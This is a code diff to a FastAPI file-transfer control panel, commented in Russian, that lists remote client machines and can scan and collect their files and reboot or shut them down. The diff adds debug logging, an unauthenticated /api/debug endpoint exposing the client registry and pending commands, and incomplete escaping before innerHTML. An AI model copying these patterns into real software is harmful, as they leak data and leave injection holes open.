@@ -111,8 +111,14 @@ async def get_client_files(client_id: str):
 async def get_all_clients():
     """Получение списка всех клиентов"""
     import json
-    print(f"DEBUG: Возвращаем клиентов: {json.dumps(clients_registry, indent=2)}")
-    return {"clients": clients_registry}
+    print(f"DEBUG: Запрос списка клиентов")
+    print(f"DEBUG: Всего клиентов в реестре: {len(clients_registry)}")
+    print(f"DEBUG: Содержимое реестра: {json.dumps(clients_registry, indent=2, ensure_ascii=False)}")
+    
+    # Убеждаемся, что возвращаем правильную структуру
+    result = {"clients": clients_registry}
+    print(f"DEBUG: Возвращаем: {json.dumps(result, indent=2, ensure_ascii=False)}")
+    return result
 
 @app.post("/client/status")
 async def receive_client_status(status: ClientStatus):
@@ -153,6 +159,16 @@ async def set_client_config(client_id: str, config: ClientConfig):
 @app.get("/api/downloaded-files")
 async def get_downloaded_files():
     return {"files": uploaded_files_metadata}
+
+@app.get("/api/debug")
+async def debug_info():
+    """Отладочная информация"""
+    return {
+        "clients_registry": clients_registry,
+        "clients_count": len(clients_registry),
+        "client_files": {k: len(v) for k, v in client_files.items()},
+        "pending_commands": {k: len(v) for k, v in pending_commands.items()}
+    }
 
 @app.post("/upload/")
 async def upload_file(
@@ -350,10 +366,15 @@ async def main_page():
             <div class="container">
                 <div class="header">
                     <h1>📁 Access File Transfer — Центр управления</h1>
-                    <button class="btn btn-refresh" onclick="refreshAll()">🔄 Обновить</button>
+                    <div>
+                        <button class="btn btn-refresh" onclick="refreshAll()">🔄 Обновить</button>
+                        <button class="btn btn-primary" onclick="window.open('/api/debug', '_blank')" style="margin-left:8px;">🔍 Отладка</button>
+                    </div>
                 </div>
                 
-                <div id="clientsList"></div>
+                <div id="clientsList">
+                    <p style="text-align:center; color:#7f8c8d;">Загрузка...</p>
+                </div>
 
                 <div class="client-card downloaded-files">
                     <h3>⬇️ Загруженные файлы</h3>
@@ -367,7 +388,7 @@ async def main_page():
                 function organizeFilesIntoTree(files) {
                     const tree = {};
                     files.forEach(file => {
-                        const parts = file.filepath.split(/[/\\]/);
+                        const parts = file.filepath.split(/[\/\\]/);
                         let current = tree;
                         for (let i = 0; i < parts.length; i++) {
                             const part = parts[i];
@@ -427,7 +448,7 @@ async def main_page():
                             const fileDiv = document.createElement('div');
                             fileDiv.className = 'file-item';
                             fileDiv.style.paddingLeft = (level * 20 + 12) + 'px';
-                            const fileName = file.filepath.split(/[/\\]/).pop();
+                            const fileName = file.filepath.split(/[\/\\]/).pop();
                             fileDiv.innerHTML = `
                                 <div class="file-info">
                                     <div class="file-path">📄 ${fileName}</div>
@@ -446,46 +467,73 @@ async def main_page():
 
                 async function loadAllClients() {
                     try {
+                        console.log('Запрос списка клиентов...');
                         const res = await fetch('/api/clients');
+                        console.log('Ответ получен, статус:', res.status);
+                        
                         if (!res.ok) {
-                            console.error('Ошибка загрузки клиентов:', res.status);
+                            console.error('Ошибка загрузки клиентов:', res.status, res.statusText);
+                            const container = document.getElementById('clientsList');
+                            container.innerHTML = '<p style="text-align:center; color:#e74c3c;">Ошибка загрузки: ' + res.status + '</p>';
                             return;
                         }
-                        const data = await res.json();
-                        console.log('Получены данные клиентов:', data);
-                        const container = document.getElementById('clientsList');
                         
-                        if (!data.clients || Object.keys(data.clients).length === 0) {
-                            container.innerHTML = '<p style="text-align:center; color:#7f8c8d;">Нет подключённых клиентов</p>';
+                        const data = await res.json();
+                        console.log('Получены данные клиентов:', JSON.stringify(data, null, 2));
+                        console.log('Тип данных:', typeof data);
+                        console.log('Есть ли clients:', 'clients' in data);
+                        console.log('Количество клиентов:', data.clients ? Object.keys(data.clients).length : 0);
+                        
+                        const container = document.getElementById('clientsList');
+                        if (!container) {
+                            console.error('Элемент clientsList не найден!');
+                            return;
+                        }
+                        
+                        if (!data || !data.clients || Object.keys(data.clients).length === 0) {
+                            console.log('Нет клиентов для отображения');
+                            container.innerHTML = '<p style="text-align:center; color:#7f8c8d;">Нет подключённых клиентов. Убедитесь, что клиент запущен и подключен к серверу.</p>';
                             return;
                         }
 
                         container.innerHTML = '';
+                        console.log('Начинаем отрисовку клиентов, количество:', Object.keys(data.clients).length);
+                        
                         for (const [clientId, info] of Object.entries(data.clients)) {
-                        const div = document.createElement('div');
-                        div.className = 'client-card';
-                        div.innerHTML = `
-                            <div class="client-header">
-                                <div class="client-info">
-                                    <h3>🖥️ ${clientId}</h3>
-                                    <div class="client-meta">
-                                        <strong>IP:</strong> ${info.ip} | 
-                                        <strong>Последний раз видели:</strong> ${new Date(info.last_seen).toLocaleString()}
+                            console.log('Отрисовка клиента:', clientId, info);
+                            const div = document.createElement('div');
+                            div.className = 'client-card';
+                            
+                            // Экранируем специальные символы для безопасности
+                            const safeClientId = clientId.replace(/'/g, "\\'");
+                            const safeIp = (info.ip || 'неизвестно').replace(/'/g, "\\'");
+                            const lastSeen = info.last_seen ? new Date(info.last_seen).toLocaleString() : 'никогда';
+                            
+                            div.innerHTML = `
+                                <div class="client-header">
+                                    <div class="client-info">
+                                        <h3>🖥️ ${safeClientId}</h3>
+                                        <div class="client-meta">
+                                            <strong>IP:</strong> ${safeIp} | 
+                                            <strong>Последний раз видели:</strong> ${lastSeen}
+                                        </div>
+                                    </div>
+                                    <div class="client-actions">
+                                        <button class="btn btn-primary" onclick="requestScan('${safeClientId}')">🔍 Сканировать</button>
+                                        <button class="btn btn-success" onclick="showFiles('${safeClientId}')">📂 Файлы</button>
+                                        <button class="btn btn-primary" onclick="showConfig('${safeClientId}')">⚙️ Настройки</button>
+                                        <button class="btn btn-warning" onclick="rebootClient('${safeClientId}')">🔄 Перезагрузить</button>
+                                        <button class="btn btn-danger" onclick="shutdownClient('${safeClientId}')">⏻ Выключить</button>
                                     </div>
                                 </div>
-                                <div class="client-actions">
-                                    <button class="btn btn-primary" onclick="requestScan('${clientId}')">🔍 Сканировать</button>
-                                    <button class="btn btn-success" onclick="showFiles('${clientId}')">📂 Файлы</button>
-                                    <button class="btn btn-primary" onclick="showConfig('${clientId}')">⚙️ Настройки</button>
-                                    <button class="btn btn-warning" onclick="rebootClient('${clientId}')">🔄 Перезагрузить</button>
-                                    <button class="btn btn-danger" onclick="shutdownClient('${clientId}')">⏻ Выключить</button>
-                                </div>
-                                <div id="config-${clientId}" class="files-section" style="display:none;"></div>
-                            </div>
-                            <div id="files-${clientId}" class="files-section" style="display:none;"></div>
-                        `;
-                        container.appendChild(div);
+                                <div id="config-${safeClientId}" class="files-section" style="display:none;"></div>
+                                <div id="files-${safeClientId}" class="files-section" style="display:none;"></div>
+                            `;
+                            container.appendChild(div);
+                            console.log('Клиент добавлен в DOM:', clientId);
                         }
+                        
+                        console.log('Все клиенты отрисованы');
                     } catch (e) {
                         console.error('Ошибка загрузки клиентов:', e);
                         const container = document.getElementById('clientsList');
@@ -772,11 +820,21 @@ async def main_page():
                     }
                 }
 
-                function refreshAll() {
+                // Объявляем функции глобально для использования в onclick
+                window.refreshAll = function() {
                     console.log('Обновление данных...');
                     loadAllClients();
                     loadDownloadedFiles();
-                }
+                };
+                
+                // Делаем функции доступными глобально
+                window.requestScan = requestScan;
+                window.showFiles = showFiles;
+                window.showConfig = showConfig;
+                window.rebootClient = rebootClient;
+                window.shutdownClient = shutdownClient;
+                window.uploadFile = uploadFile;
+                window.filterFileTree = filterFileTree;
 
                 // Обработка ошибок JavaScript
                 window.addEventListener('error', function(e) {
@@ -789,7 +847,7 @@ async def main_page():
 
                 // Загрузка при старте
                 console.log('Инициализация страницы...');
-                refreshAll();
+                window.refreshAll();
             </script>
         </body>
     </html>
